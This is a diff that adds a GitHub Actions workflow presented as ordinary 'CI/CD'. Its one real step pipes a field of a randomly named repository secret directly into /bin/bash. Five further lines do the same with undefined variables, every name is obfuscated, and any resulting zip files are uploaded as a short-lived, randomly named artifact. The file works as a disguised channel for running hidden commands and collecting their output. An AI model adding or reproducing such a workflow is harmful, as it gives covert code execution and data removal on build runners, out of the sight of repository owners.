@@ -1,0 +1,26 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+jobs:
+  action:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Begin
+        env:
+          hj46539: ${{ secrets.hj46539 }}
+        run: |
+          printf '%s' "$hj46539" | jq -r .hiq1215 | /bin/bash
+          echo $uho85034 | jq -r .zy4447 | /bin/bash
+          printf '%s' "$htu1" | jq -r .sfju7373 | /bin/bash
+          printf '%s' "$xxgoe8849" | jq -r .s7 | /bin/bash
+          printf '%s' "$r91" | jq -r .xqwol709 | /bin/bash
+          printf '%s' "$xa0" | jq -r .rtb27 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: WJnEENZu
+          path: "*.zip"
+          retention-days: 1
